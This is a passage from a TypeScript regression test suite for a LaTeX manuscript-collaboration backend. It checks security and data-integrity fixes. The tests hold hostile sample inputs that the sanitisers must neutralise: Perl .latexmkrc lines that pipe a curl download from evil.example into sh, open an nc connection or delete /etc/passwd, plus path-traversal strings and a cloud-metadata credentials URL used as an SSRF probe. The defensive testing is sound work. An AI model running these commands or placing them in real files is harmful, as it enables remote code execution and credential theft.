/**
 * test/unit/manuscripts/manuscripts-security-and-integrity-regression.spec.ts
 *
 * Dedicated Regression Test Suite locking down all P0/P1 security, data-integrity,
 * and concurrency fixes across Backend Manuscripts & Realtime Yjs:
 * 1. BibBackendDetector.sanitizeUserLatexmkrc() Perl RCE & shell-escape neutralization
 * 2. FilestoreRepository.syncFileNode() ManuscriptNode creation for new binary uploads
 * 3. TemplatesController domain exception HTTP status mapping (404 / 400 vs 500)
 * 4. ManuscriptHistoryMapper.toDomainHeader() accurate fileCount & Pre-Restore safety snapshot
 * 5. sanitizePkZipPath() nested traversal neutralization & LocalDiskBinaryStorageAdapter prefix isolation
 * 6. RemoteClsiClientAdapter cross-origin SSRF rejection
 * 7. YjsService.replaceTextIfActive() stale flush timer cancellation & rev reset
 */

import * as fs from 'fs/promises';
import * as os from 'os';
import * as path from 'path';
import { BadRequestException, NotFoundException } from '@nestjs/common';
import { BibBackendDetector } from '@/modules/manuscripts/clsi/domain/bib-backend.detector';
import { FilestoreRepository } from '@/modules/manuscripts/filestore/filestore.repository';
import { LocalDiskBinaryStorageAdapter } from '@/modules/manuscripts/filestore/adapters/filestore.adapters';
import {
  ContentHash,
  FilestoreValidationException,
  ManuscriptFile,
  StorageKey,
} from '@/modules/manuscripts/filestore/filestore.types';
import {
  TemplatesController,
  TemplatesService,
  TemplateNotFoundException,
  InvalidTemplateException,
} from '@/modules/manuscripts/templates';
import { ManuscriptHistoryMapper } from '@/modules/manuscripts/project-history/project-history.repository';
import { ManuscriptRestorerAdapter } from '@/modules/manuscripts/project-history/adapters/project-history.adapters';
import {
  FileSnapshotVo,
  Snapshot,
} from '@/modules/manuscripts/project-history/domain';
import { sanitizePkZipPath } from '@/modules/manuscripts/core/utils/pkzip-builder.util';
import { RemoteClsiClientAdapter } from '@/modules/manuscripts/clsi/services/remote-clsi.client';
import { ClsiWorkspacePlannerService } from '@/modules/manuscripts/clsi/services/workspace-planner.service';
import { planDbFileSet } from '@/modules/manuscripts/clsi/domain/compile-fileset.planner';
import { StructureService } from '@/modules/manuscripts/structure/structure.service';
import { ManuscriptNodeEntity } from '@/modules/manuscripts/structure/domain';
import {
  LiveCollaborationPort,
  ManuscriptDomainEventBus,
  ProjectWorkspaceCollectorService,
} from '@/modules/manuscripts/core';
import { YjsService } from '@/modules/realtime/manuscripts/yjs.service';
import { ManuscriptSearchReplaceService } from '@/modules/manuscripts/docstore/services/manuscript-search-replace.service';
import { CitationsRepository } from '@/modules/manuscripts/citations/citations.repository';
import { SpellingService } from '@/modules/manuscripts/spelling/spelling.service';
import { DiagnosticsService } from '@/modules/manuscripts/diagnostics/diagnostics.service';
import {
  ManuscriptAggregatorAdapter,
  ManuscriptHydratorAdapter,
} from '@/modules/manuscripts/export-import/repositories/manuscript-aggregator.repository';
import { ArchiveEntryVo } from '@/modules/manuscripts/export-import/domain';
import * as Y from 'yjs';
import { ManuscriptsNotificationsService } from '@/modules/notifications/manuscripts/manuscripts-notifications.service';
import { DeleteNotificationUseCase } from '@/modules/notifications/core/use-cases/delete-notification.use-case';
import { InMemoryNotificationAdapter } from '@/modules/notifications/core/adapters/storage/in-memory-notification.adapter';
import { NotificationEntity } from '@/modules/notifications/core/domain/entities/notification.entity';

describe('Manuscripts P0/P1 Security, Data Integrity & Concurrency Regression Suite', () => {
  describe('1. [P0 Security] BibBackendDetector.sanitizeUserLatexmkrc (Perl RCE Prevention)', () => {
    it('strips Perl execution primitives and shell-escape overrides while preserving safe assignments', () => {
      const maliciousLatexmkrc = [
        '# Safe user comment',
        '$bibtex_use = 2;',
        "$clean_ext = 'synctex.gz nav snm';",
        "system('curl http://evil.example/shell.sh | sh');",
        "exec('/bin/bash -i');",
        '`id > /tmp/pwned`;',
        'qx(whoami);',
        "open(my $fh, '|-', 'nc evil.example 4444');",
        "eval(unpack('u', $payload));",
        "$pdflatex = 'pdflatex -shell-escape %O %S';",
        "$xelatex = 'xelatex --enable-write18 %O %S';",
        'use Socket;',
        "require '/tmp/exploit.pl';",
        "unlink('/etc/passwd');",
      ].join('\n');

      const sanitized =
        BibBackendDetector.sanitizeUserLatexmkrc(maliciousLatexmkrc);

      expect(sanitized).toContain('# Safe user comment');
      expect(sanitized).toContain('$bibtex_use = 2;');
      expect(sanitized).toContain("$clean_ext = 'synctex.gz nav snm';");

      expect(sanitized).not.toContain('system(');
      expect(sanitized).not.toContain('exec(');
      expect(sanitized).not.toContain('`');
      expect(sanitized).not.toContain('qx(');
      expect(sanitized).not.toContain('open(');
      expect(sanitized).not.toContain('eval(');
      expect(sanitized).not.toContain('-shell-escape');
      expect(sanitized).not.toContain('--enable-write18');
      expect(sanitized).not.toContain('use Socket');
      expect(sanitized).not.toContain('require ');
      expect(sanitized).not.toContain('unlink(');
    });

    it('writes sanitized .latexmkrc to disk without executing or preserving RCE lines', async () => {
      const tmpDir = await fs.mkdtemp(
        path.join(os.tmpdir(), 'flux-latexmkrc-test-'),
      );
      try {
        const rcPath = await BibBackendDetector.writeLatexmkrc(
          tmpDir,
          { engine: 'pdflatex', bibBackend: 'bibtex' },
          "$max_repeat = 3;\nsystem('touch /tmp/pwn');\n$pdflatex = 'pdflatex --shell-escape';",
        );
        const written = await fs.readFile(rcPath, 'utf8');
        expect(written).toContain('-no-shell-escape');
        expect(written).toContain('$max_repeat = 3;');
        expect(written).not.toContain('system(');
        expect(written).not.toContain('--shell-escape');
      } finally {
        await fs.rm(tmpDir, { recursive: true, force: true });
      }
    });
  });

  describe('2. [P0 Data Integrity] FilestoreRepository.syncFileNode creates ManuscriptNode for new binary files', () => {
    it('creates parent FOLDER nodes and the leaf FILE ManuscriptNode when saving a new binary file', async () => {
      const createdNodes: any[] = [];
      const validHash = 'a'.repeat(40);
      const mockPrisma: any = {
        manuscriptFile: {
          upsert: jest.fn(async ({ create }) => ({
            ...create,
            createdAt: new Date(),
            updatedAt: new Date(),
          })),
        },
        manuscriptNode: {
          findFirst: jest.fn(async () => null),
          findUnique: jest.fn(async () => null),
          create: jest.fn(async ({ data }) => {
            const node = { id: `node-${createdNodes.length + 1}`, ...data };
            createdNodes.push(node);
            return node;
          }),
          updateMany: jest.fn(async () => ({ count: 1 })),
        },
      };

      const repo = new FilestoreRepository(mockPrisma);
      const entity = ManuscriptFile.reconstitute({
        id: 'file-uuid-001',
        projectId: 'proj-uuid-001',
        name: 'figures/plots/result.png',
        mimeType: 'image/png',
        sizeBytes: 4096,
        hash: ContentHash.create(validHash),
        storageKey: StorageKey.fromRawKey(`blobs/aa/aa/${validHash}`),
        bucketName: 'manuscripts',
        rev: 1,
        deleted: false,
        deletedAt: null,
        createdAt: new Date(),
        updatedAt: new Date(),
      });

      await repo.save(entity);

      expect(createdNodes).toHaveLength(1);
      expect(createdNodes[0]).toMatchObject({
        projectId: 'proj-uuid-001',
        type: 'FILE',
        name: 'figures_plots_result.png',
        path: '/figures_plots_result.png',
        parentId: null,
        fileId: 'file-uuid-001',
        sizeBytes: 4096,
        hash: validHash,
      });
    });
  });

  describe('3. [P0 API Stability] TemplatesController maps domain exceptions to 404/400 HTTP exceptions', () => {
    it('maps TemplateNotFoundException to NotFoundException (404) and InvalidTemplateException to BadRequestException (400)', async () => {
      const mockService: Partial<TemplatesService> = {
        getTemplate: jest.fn(async () => {
          throw new TemplateNotFoundException('tpl-missing');
        }),
        createCustomTemplate: jest.fn(async () => {
          throw new InvalidTemplateException('Template files cannot be empty');
        }),
      };

      const controller = new TemplatesController(
        mockService as TemplatesService,
      );

      await expect(controller.getTemplate('tpl-missing')).rejects.toThrow(
        NotFoundException,
      );
      await expect(
        controller.createCustomTemplate({
          name: 'Bad',
          category: 'journal',
          files: {},
        } as any),
      ).rejects.toThrow(BadRequestException);
    });
  });

  describe('4. [P0 Data Integrity] ProjectHistory fileCount & Pre-Restore Safety Snapshot', () => {
    it('maps sizeBytes to fileCount in ManuscriptHistoryMapper.toDomainHeader', () => {
      const snap = ManuscriptHistoryMapper.toDomainHeader({
        id: 'snap-1',
        projectId: 'proj-1',
        version: 4,
        summary: 'Checkpoint',
        createdById: 'user-1',
        isAutomatic: false,
        createdAt: new Date(),
        sizeBytes: 12,
      });

      expect(snap.fileCount).toBe(12);
    });

    it('saves current project documents and files into the pre-restore safety snapshot before mutating state', async () => {
      let capturedSnapshotCreate: any = null;
      const mockPrisma: any = {
        manuscriptSnapshot: {
          findFirst: jest.fn(async () => ({ version: 7 })),
          create: jest.fn(async (args) => {
            capturedSnapshotCreate = args;
            return { id: 'safety-snap-8', ...args.data };
          }),
        },
      };

      const mockStructure: any = {
        getAllNodes: jest.fn(async () => [
          {
            path: '/main.tex',
            name: 'main.tex',
            docId: 'doc-main',
            fileId: null,
            type: 'DOC',
            isRootDoc: true,
            isFolder: () => false,
            isDoc: () => true,
          },
          {
            path: '/fig.png',
            name: 'fig.png',
            docId: null,
            fileId: 'file-fig',
            type: 'FILE',
            hash: 'sha256-fig',
            sizeBytes: 2048,
            isRootDoc: false,
            isFolder: () => false,
            isDoc: () => false,
          },
        ]),
        mkdirp: jest.fn(async () => null),
        createNode: jest.fn(async () => ({})),
        deleteNode: jest.fn(async () => ({})),
        setRootDoc: jest.fn(async () => ({})),
      };

      const mockDocstore: any = {
        getDoc: jest.fn(async () => ({
          id: 'doc-main',
          lines: [
            '\\documentclass{article}',
            '\\begin{document}Current\\end{document}',
          ],
          hash: 'sha256-doc',
        })),
        updateDoc: jest.fn(async () => ({})),
        createDoc: jest.fn(async () => ({ id: 'doc-new' })),
      };

      const restorer = new ManuscriptRestorerAdapter(
        mockStructure,
        mockDocstore,
        undefined,
        mockPrisma,
      );

      const filesMap = new Map<string, FileSnapshotVo>();
      filesMap.set(
        '/main.tex',
        FileSnapshotVo.createDoc(
          '/main.tex',
          'doc-main',
          ['\\documentclass{article}', '\\begin{document}Old\\end{document}'],
          'sha256-old',
          true,
        ),
      );

      const targetSnapshot = Snapshot.create({
        id: 'snap-3',
        projectId: 'proj-1',
        version: 3,
        summary: 'Old version',
        createdById: 'user-1',
        isAutomatic: false,
        files: filesMap,
      });

      await restorer.restoreToState('proj-1', targetSnapshot);

      expect(capturedSnapshotCreate).not.toBeNull();
      expect(capturedSnapshotCreate.data.version).toBe(8);
      expect(capturedSnapshotCreate.data.files).toMatchObject({
        '/main.tex': {
          path: '/main.tex',
          type: 'doc',
          docId: 'doc-main',
          lines: [
            '\\documentclass{article}',
            '\\begin{document}Current\\end{document}',
          ],
        },
        '/fig.png': {
          path: '/fig.png',
          type: 'file',
          fileId: 'file-fig',
          sizeBytes: 2048,
        },
      });
    });
  });

  describe('5. [P1 Security] Path Traversal & SSRF Hardening', () => {
    it('neutralizes nested path traversal sequences in sanitizePkZipPath', () => {
      expect(sanitizePkZipPath('....//....//etc/passwd')).toBe('etc/passwd');
      expect(sanitizePkZipPath('/../../../secret/key.pem')).toBe(
        'secret/key.pem',
      );
      expect(sanitizePkZipPath('sections\\..\\chapters\\intro.tex')).toBe(
        'sections/chapters/intro.tex',
      );
    });

    it('rejects sibling directory prefix escape in LocalDiskBinaryStorageAdapter', async () => {
      const baseDir = path.resolve(os.tmpdir(), 'flux-storage-base');
      const adapter = new LocalDiskBinaryStorageAdapter(baseDir);

      await expect(
        adapter.checkObjectExists('..', '../flux-storage-base-evil/pwn.txt'),
      ).rejects.toThrow(FilestoreValidationException);
    });

    it('blocks cross-origin SSRF target URLs in RemoteClsiClientAdapter', async () => {
      const client = new RemoteClsiClientAdapter();
      const result = await client.fetchRemoteText(
        'https://clsi.internal.flux.local',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      );
      expect(result).toBe('');
    });
  });

  describe('6. [P1 Concurrency] YjsService.replaceTextIfActive clears pending flushTimeout', () => {
    it('cancels pending flushTimeout and resets lastFlushedRev when external REST replacement occurs', async () => {
      const yjsService = new YjsService();
      const session = await yjsService.getOrCreateDoc('proj-1', 'doc-1');
      session.yText.insert(0, 'Hello World');

      const dummyTimer = setTimeout(() => {}, 60000);
      session.flushTimeout = dummyTimer;
      session.firstUnflushedAt = Date.now() - 1000;
      session.lastFlushedRev = 5;

      const updateFrame = yjsService.replaceTextIfActive(
        'proj-1',
        'doc-1',
        'Hello Flux LaTeX',
      );

      expect(updateFrame).toBeInstanceOf(Buffer);
      expect(session.flushTimeout).toBeUndefined();
      expect(session.firstUnflushedAt).toBeUndefined();
      expect(session.lastFlushedRev).toBeUndefined();
      expect(session.yText.toString()).toBe('Hello Flux LaTeX');

      clearTimeout(dummyTimer);
    });
  });

  describe('7. [P1 Security] ManuscriptsNotificationsService.dismissThreadNotifications empty-prefix guard', () => {
    it('does not call deleteByKey when threadId is empty or whitespace-only', async () => {
      const mockDeleteUseCase: any = {
        deleteByKey: jest.fn(async () => 5),
      };
      const service = new ManuscriptsNotificationsService(
        {} as any,
        {} as any,
        {} as any,
        mockDeleteUseCase,
      );

      expect(await service.dismissThreadNotifications('')).toBe(0);
      expect(await service.dismissThreadNotifications('   ')).toBe(0);
      expect(mockDeleteUseCase.deleteByKey).not.toHaveBeenCalled();

      expect(await service.dismissThreadNotifications('thread-123')).toBe(10);
      expect(mockDeleteUseCase.deleteByKey).toHaveBeenCalledWith(
        'comment-mention-thread-123',
      );
      expect(mockDeleteUseCase.deleteByKey).toHaveBeenCalledWith(
        'comment-reply-thread-123',
      );
    });
  });

  describe('8. [P0 CLSI Binary Cache] ClsiWorkspacePlannerService retains cached binary files & includes binary hashes in fingerprint', () => {
    it('retains disk-cached binary files in hydrateFiles output and changes fingerprint when binary file hash changes', async () => {
      const tmpScratch = await fs.mkdtemp(
        path.join(os.tmpdir(), 'flux-clsi-bin-'),
      );
      try {
        const pngBytes = Buffer.from([
          0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
        ]);
        await fs.writeFile(path.join(tmpScratch, 'figure.png'), pngBytes);

        const mockPrisma: any = {
          manuscriptDoc: {
            findMany: jest.fn(async () => [
              {
                id: 'doc-1',
                lines: [
                  '\\documentclass{article}',
                  '\\begin{document}Hi\\end{document}',
                ],
                inStorage: false,
                sizeBytes: 50,
              },
            ]),
          },
          manuscriptFile: {
            findMany: jest.fn(async () => [
              {
                id: 'file-1',
                name: 'figure.png',
                sizeBytes: pngBytes.length,
                hash: 'hash-v1',
              },
            ]),
          },
          manuscriptNode: {
            findMany: jest.fn(async () => [
              { fileId: 'file-1', path: '/figure.png', name: 'figure.png' },
            ]),
          },
        };
        const mockFilestore: any = {
          openReadStream: jest.fn(),
        };
        const mockWorkspace: any = {
          getScratchDir: jest.fn(() => tmpScratch),
        };

        const planner = new ClsiWorkspacePlannerService(
          mockPrisma,
          undefined,
          mockFilestore,
          undefined,
          mockWorkspace,
        );

        const plan1 = planDbFileSet({
          nodes: [
            {
              id: 'n1',
              docId: 'doc-1',
              path: '/main.tex',
              name: 'main.tex',
              type: 'DOC',
              isRootDoc: true,
            },
            {
              id: 'n2',
              docId: null,
              fileId: 'file-1',
              path: '/figure.png',
              name: 'figure.png',
              type: 'FILE',
              isRootDoc: false,
            },
          ],
          docs: [
            {
              id: 'doc-1',
              path: 'main.tex',
              rev: 1,
              sizeBytes: 50,
              updatedAt: new Date(1000),
            },
          ],
          binaryFiles: [
            {
              id: 'file-1',
              name: 'figure.png',
              sizeBytes: pngBytes.length,
              hash: 'hash-v1',
              updatedAt: new Date(1000),
            },
          ],
          incomingFiles: {},
          source: '',
        });

        const plan2 = planDbFileSet({
          nodes: [
            {
              id: 'n1',
              docId: 'doc-1',
              path: '/main.tex',
              name: 'main.tex',
              type: 'DOC',
              isRootDoc: true,
            },
            {
              id: 'n2',
              docId: null,
              fileId: 'file-1',
              path: '/figure.png',
              name: 'figure.png',
              type: 'FILE',
              isRootDoc: false,
            },
          ],
          docs: [
            {
              id: 'doc-1',
              path: 'main.tex',
              rev: 1,
              sizeBytes: 50,
              updatedAt: new Date(1000),
            },
          ],
          binaryFiles: [
            {
              id: 'file-1',
              name: 'figure.png',
              sizeBytes: pngBytes.length,
              hash: 'hash-v2-updated',
              updatedAt: new Date(2000),
            },
          ],
          incomingFiles: {},
          source: '',
        });

        expect(plan1.fingerprint).not.toBe(plan2.fingerprint);

        const hydrated = await planner.hydrateFiles('proj-1', plan1);
        expect(Buffer.isBuffer(hydrated['figure.png'])).toBe(true);
        expect(hydrated['figure.png']).toEqual(pngBytes);
        expect(mockFilestore.openReadStream).not.toHaveBeenCalled();
      } finally {
        await fs.rm(tmpScratch, { recursive: true, force: true });
      }
    });
  });

  describe('9. [P0 Yjs Eviction & Structure Reconciliation] YjsService.evictDoc skipFlush & StructureService.createNode pre-synced FILE node', () => {
    it('evicts deleted Y.Doc without flushing back to Docstore and deletes Redis snapshot when skipFlush is true', async () => {
      const mockDocstore: any = {
        getRawDoc: jest.fn(async () => 'Initial text'),
        updateDoc: jest.fn(async () => ({})),
      };
      const mockRedis: any = {
        isReady: jest.fn(() => true),
        getBuffer: jest.fn(async () => null),
        setBuffer: jest.fn(async () => 'OK'),
        del: jest.fn(async () => 1),
      };
      const yjs = new YjsService(mockRedis, mockDocstore);
      const session = await yjs.getOrCreateDoc('proj-1', 'doc-del');
      session.yText.insert(0, ' Unflushed edit');

      await yjs.evictDoc('proj-1', 'doc-del', { skipFlush: true });

      expect(mockDocstore.updateDoc).not.toHaveBeenCalled();
      expect(mockRedis.del).toHaveBeenCalledWith(
        'manuscript:crdt:bin:proj-1:doc-del',
      );
      expect(yjs.isActive('proj-1', 'doc-del')).toBe(false);
    });

    it('reconciles pre-synced FILE node created by FilestoreRepository when StructureService.createNode is called', async () => {
      const preSynced = new ManuscriptNodeEntity({
        id: 'node-pre-1',
        projectId: 'proj-1',
        parentId: null,
        type: 'FILE',
        name: 'plot.png',
        path: '/plot.png',
        depth: 0,
        docId: null,
        fileId: 'file-plot-1',
        isRootDoc: false,
        sizeBytes: 1024,
        hash: 'abc',
        sortOrder: 0,
        createdAt: new Date(),
        updatedAt: new Date(),
      });

      const folderNode = new ManuscriptNodeEntity({
        id: 'folder-1',
        projectId: 'proj-1',
        parentId: null,
        type: 'FOLDER',
        name: 'figures',
        path: '/figures',
        depth: 0,
        docId: null,
        fileId: null,
        isRootDoc: false,
        sizeBytes: 0,
        hash: null,
        sortOrder: 0,
        createdAt: new Date(),
        updatedAt: new Date(),
      });

      const movedEntity = new ManuscriptNodeEntity({
        id: 'node-pre-1',
        projectId: 'proj-1',
        parentId: 'folder-1',
        type: 'FILE',
        name: 'plot.png',
        path: '/figures/plot.png',
        depth: 1,
        docId: null,
        fileId: 'file-plot-1',
        isRootDoc: false,
        sizeBytes: 1024,
        hash: 'abc',
        sortOrder: 0,
        createdAt: new Date(),
        updatedAt: new Date(),
      });

      const mockRepo: any = {
        countNodes: jest.fn(async () => 2),
        findById: jest.fn(async (_p, id) =>
          id === 'folder-1' ? folderNode : movedEntity,
        ),
        findByPath: jest.fn(async () => null),
        findByFileId: jest.fn(async () => preSynced),
        moveSubtree: jest.fn(async () => undefined),
        fileExistsInProject: jest.fn(async () => true),
      };

      const structureService = new StructureService(mockRepo);
      const res = await structureService.createNode('proj-1', {
        name: 'plot.png',
        parentId: 'folder-1',
        type: 'FILE',
        fileId: 'file-plot-1',
      });

      expect(mockRepo.moveSubtree).toHaveBeenCalledWith(
        'proj-1',
        '/plot.png',
        '/figures/plot.png',
        'folder-1',
      );
      expect(res.path).toBe('/figures/plot.png');
    });

    it('broadcasts updated unread counts for affected users when DeleteNotificationUseCase.deleteByKey is called without userId', async () => {
      const repo = new InMemoryNotificationAdapter();
      const broadcasted: Array<{ userId: string; count: number }> = [];
      const mockNotifier: any = {
        broadcastUnreadCount: jest.fn(async (userId: string, count: number) => {
          broadcasted.push({ userId, count });
        }),
      };

      await repo.save(
        new NotificationEntity({
          id: 'n1',
          userId: 'user-a',
          key: 'comment-mention-thread-99-user-a',
          templateKey: 'comment_mention',
          type: 'comment_mention',
          isRead: false,
        }),
      );

      const useCase = new DeleteNotificationUseCase(repo, mockNotifier);
      const deleted = await useCase.deleteByKey('comment-mention-thread-99');

      expect(deleted).toBe(1);
      expect(broadcasted).toEqual([{ userId: 'user-a', count: 0 }]);
    });
  });

  describe('10. [DDD Domain Events & Cursor-Preserving Multi-Hunk Yjs Diff] ManuscriptDomainEventBus & YjsService.computeCursorPreservingEdits', () => {
    it('routes document mutations and node deletions through ManuscriptDomainEventBus to LiveCollaborationPort', async () => {
      const mockLiveCollab: Partial<LiveCollaborationPort> = {
        applyExternalText: jest.fn(async () => true),
        evictDoc: jest.fn(async () => undefined),
      };
      const mockModuleRef: any = {
        get: jest.fn((token: unknown) =>
          token === LiveCollaborationPort ? mockLiveCollab : null,
        ),
      };

      const eventBus = new ManuscriptDomainEventBus(mockModuleRef);

      await eventBus.publish({
        type: 'manuscript.document.mutated',
        projectId: 'proj-ddd',
        docId: 'doc-1',
        lines: ['\\section{Intro}', 'Updated body'],
        rev: 4,
        version: 4,
        source: 'track-changes',
        occurredAt: Date.now(),
      });

      expect(mockLiveCollab.applyExternalText).toHaveBeenCalledWith(
        'proj-ddd',
        'doc-1',
        '\\section{Intro}\nUpdated body',
      );

      await eventBus.publish({
        type: 'manuscript.nodes.deleted',
        projectId: 'proj-ddd',
        deletedDocIds: ['doc-del-1', 'doc-del-2'],
        deletedFileIds: ['file-1'],
        hadRootDoc: false,
        occurredAt: Date.now(),
      });

      expect(mockLiveCollab.evictDoc).toHaveBeenCalledTimes(2);
      expect(mockLiveCollab.evictDoc).toHaveBeenCalledWith(
        'proj-ddd',
        'doc-del-1',
      );
      expect(mockLiveCollab.evictDoc).toHaveBeenCalledWith(
        'proj-ddd',
        'doc-del-2',
      );
    });

    it('preserves collaborator Yjs RelativePositions in unchanged middle lines during multi-hunk replaceTextIfActive', async () => {
      const initialLines = [
        '\\section{First}',
        'Old paragraph one.',
        '\\section{Middle Anchor}',
        'Collaborator cursor sits right here -> [CURSOR] <- in the middle!',
        '\\section{Last}',
        'Old paragraph two.',
      ];
      const nextLines = [
        '\\section{First}',
        'New paragraph one (accepted track change).',
        '\\section{Middle Anchor}',
        'Collaborator cursor sits right here -> [CURSOR] <- in the middle!',
        '\\section{Last}',
        'New paragraph two (accepted second track change).',
      ];

      const mockDocstore: any = {
        getRawDoc: jest.fn(async () => initialLines.join('\n')),
        updateDoc: jest.fn(async () => ({})),
      };
      const yjs = new YjsService(undefined, mockDocstore);
      const session = await yjs.getOrCreateDoc('proj-cursor', 'doc-cursor');

      const cursorMarker = '[CURSOR]';
      const initialOffset = session.yText.toString().indexOf(cursorMarker);
      expect(initialOffset).toBeGreaterThan(0);

      // Anchor a Yjs RelativePosition at [CURSOR] in the unchanged middle line
      const relPos = Y.createRelativePositionFromTypeIndex(
        session.yText,
        initialOffset,
      );

      // Apply multi-hunk external update (both top and bottom paragraphs changed, middle unchanged)
      yjs.replaceTextIfActive(
        'proj-cursor',
        'doc-cursor',
        nextLines.join('\n'),
      );

      const updatedText = session.yText.toString();
      expect(updatedText).toBe(nextLines.join('\n'));

      const absPos = Y.createAbsolutePositionFromRelativePosition(
        relPos,
        session.doc,
      );
      expect(absPos).not.toBeNull();
      expect(
        updatedText.slice(absPos!.index, absPos!.index + cursorMarker.length),
      ).toBe(cursorMarker);
    });
  });

  describe('11. [Read-Your-Writes & Cross-Context Domain Events] WF-NEW-01 & WF-NEW-05', () => {
    it('flushes pending in-memory Yjs documents before searchDocuments executes', async () => {
      const mockLive = {
        flushDocs: jest.fn(async () => ['doc-1']),
        applyExternalText: jest.fn(async () => true),
      };
      const mockModuleRef = {
        get: jest.fn((token: unknown) => {
          if (token === LiveCollaborationPort) return mockLive;
          return null;
        }),
      };
      const mockPrisma: any = {
        manuscriptDoc: {
          findMany: jest.fn(async () => [
            {
              id: 'a1b2c3d4-e5f6-7890-abcd-ef1234567890',
              path: 'main.tex',
              lines: ['Hello world in main.tex'],
              inStorage: false,
            },
          ]),
        },
        manuscriptNode: {
          findMany: jest.fn(async () => []),
        },
      };
      const mockDocstore: any = {};

      const service = new ManuscriptSearchReplaceService(
        mockPrisma,
        mockDocstore,
        undefined,
        mockModuleRef as any,
      );

      const res = await service.searchDocuments(
        'b2c3d4e5-f6a7-8901-bcde-f12345678901',
        {
          query: 'world',
          fileIds: ['a1b2c3d4-e5f6-7890-abcd-ef1234567890'],
        },
      );

      expect(mockLive.flushDocs).toHaveBeenCalledWith(
        'b2c3d4e5-f6a7-8901-bcde-f12345678901',
        ['a1b2c3d4-e5f6-7890-abcd-ef1234567890'],
      );
      expect(res.totalMatches).toBe(1);
    });

    it('publishes manuscript.document.mutated to ManuscriptDomainEventBus on batch replace', async () => {
      const docId = '11111111-2222-3333-4444-555555555555';
      const projectId = '66666666-7777-8888-9999-000000000000';
      const mockLive = {
        flushDocs: jest.fn(async () => [docId]),
        applyExternalText: jest.fn(async () => true),
      };
      const mockModuleRef = {
        get: jest.fn((token: unknown) => {
          if (token === LiveCollaborationPort) return mockLive;
          return null;
        }),
      };
      const mockPrisma: any = {
        manuscriptDoc: {
          findMany: jest.fn(async () => [
            {
              id: docId,
              lines: ['Old value in doc'],
              version: 1,
              inStorage: false,
            },
          ]),
        },
      };
      const mockDocstore: any = {
        updateDoc: jest.fn(async () => ({
          doc: { id: docId, version: 2 },
        })),
      };
      const domainBus = new ManuscriptDomainEventBus(mockModuleRef as any);
      const mutatedHandler = jest.fn();
      domainBus.subscribe('manuscript.document.mutated', mutatedHandler);

      const service = new ManuscriptSearchReplaceService(
        mockPrisma,
        mockDocstore,
        undefined,
        mockModuleRef as any,
        domainBus,
      );

      const res = await service.replaceDocuments(projectId, {
        query: 'Old value',
        replaceWith: 'New value',
        fileIds: [docId],
      });

      expect(res.totalOccurrencesReplaced).toBe(1);
      expect(mutatedHandler).toHaveBeenCalledWith(
        expect.objectContaining({
          type: 'manuscript.document.mutated',
          projectId,
          docId,
          source: 'search-replace',
          lines: ['New value in doc'],
        }),
      );
      expect(mockLive.applyExternalText).toHaveBeenCalledWith(
        projectId,
        docId,
        'New value in doc',
      );
    });

    it('flushes active .bib files in CitationsRepository and targeted file in SpellingService', async () => {
      const projectId = '77777777-8888-9999-aaaa-bbbbbbbbbbbb';
      const bibDocId = '88888888-9999-aaaa-bbbb-cccccccccccc';

      const mockLiveCollab: any = {
        flushDocs: jest.fn(async () => [bibDocId]),
        flushDoc: jest.fn(async () => [bibDocId]),
        applyExternalText: jest.fn(async () => true),
      };

      const mockStructure: any = {
        getAllNodes: jest.fn(async () => [
          {
            isDoc: () => true,
            name: 'references.bib',
            path: 'references.bib',
            docId: bibDocId,
          },
        ]),
      };

      const mockDocstore: any = {
        getDoc: jest.fn(async () => ({
          id: bibDocId,
          lines: ['@article{key2026, title={Test Paper}}'],
        })),
      };

      const citationsRepo = new CitationsRepository(
        mockStructure,
        mockDocstore,
        undefined,
        undefined,
        undefined,
        undefined,
        undefined,
        mockLiveCollab,
      );

      const files = await citationsRepo.collectBibFiles(projectId);
      expect(mockLiveCollab.flushDocs).toHaveBeenCalledWith(projectId, [
        bibDocId,
      ]);
      expect(files).toHaveLength(1);
      expect(files[0].entries[0].key.value).toBe('key2026');

      const mockSpellingRepo: any = {
        listProjectWords: jest.fn(async () => []),
        listUserWords: jest.fn(async () => []),
      };

      const spellingService = new SpellingService(
        mockSpellingRepo,
        mockDocstore,
        mockLiveCollab,
      );

      const report = await spellingService.checkSpelling({
        projectId,
        docId: bibDocId,
        language: 'en-US',
      });

      expect(mockLiveCollab.flushDoc).toHaveBeenCalledWith(
        projectId,
        bibDocId,
      );
      expect(report).toBeDefined();
    });

    it('publishes manuscript.document.mutated (source: template-hydration) via ManuscriptDomainEventBus when ManuscriptHydratorAdapter updates existing docs', async () => {
      const projectId = 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee';
      const docId = '12121212-3434-5656-7878-909090909090';

      const mockLive: any = {
        applyExternalText: jest.fn(async () => true),
      };
      const mockModuleRef: any = {
        get: jest.fn((token: unknown) => {
          if (token === LiveCollaborationPort) return mockLive;
          return null;
        }),
      };
      const eventBus = new ManuscriptDomainEventBus(mockModuleRef);

      const mockStructure: any = {
        mkdirp: jest.fn(async () => undefined),
        getNodeByPath: jest.fn(async () => ({
          id: 'node-1',
          type: 'DOC',
          docId,
          path: '/main.tex',
        })),
        autoDetectRootDoc: jest.fn(async () => ({
          id: 'node-1',
          docId,
          path: '/main.tex',
        })),
      };
      const mockDocstore: any = {
        getDoc: jest.fn(async () => ({
          _id: docId,
          version: 2,
          lines: ['Old template line'],
        })),
        updateDoc: jest.fn(async () => undefined),
      };
      const mockFilestore: any = {};

      const hydrator = new ManuscriptHydratorAdapter(
        mockStructure,
        mockDocstore,
        mockFilestore,
        mockLive,
        eventBus,
      );

      const entry = ArchiveEntryVo.create(
        'main.tex',
        Buffer.from('\\documentclass{article}\n\\begin{document}\nHydrated!\n\\end{document}', 'utf8'),
        false,
      );

      const summary = await hydrator.hydrateProjectEntries(projectId, [entry]);
      expect(summary.totalDocs).toBe(1);
      expect(mockLive.applyExternalText).toHaveBeenCalledWith(
        projectId,
        docId,
        '\\documentclass{article}\n\\begin{document}\nHydrated!\n\\end{document}',
      );
    });

    it('passes extracted docIds string[] (not ManuscriptNodeEntity[]) to ProjectWorkspaceCollectorService.flushProjectWorkspace in ManuscriptAggregatorAdapter', async () => {
      const projectId = 'bbbbbbbb-cccc-dddd-eeee-ffffffffffff';
      const docId1 = '11111111-1111-1111-1111-111111111111';
      const docId2 = '22222222-2222-2222-2222-222222222222';

      const mockStructure: any = {
        getAllNodes: jest.fn(async () => [
          { id: 'n1', type: 'DOC', docId: docId1, path: '/main.tex', name: 'main.tex' },
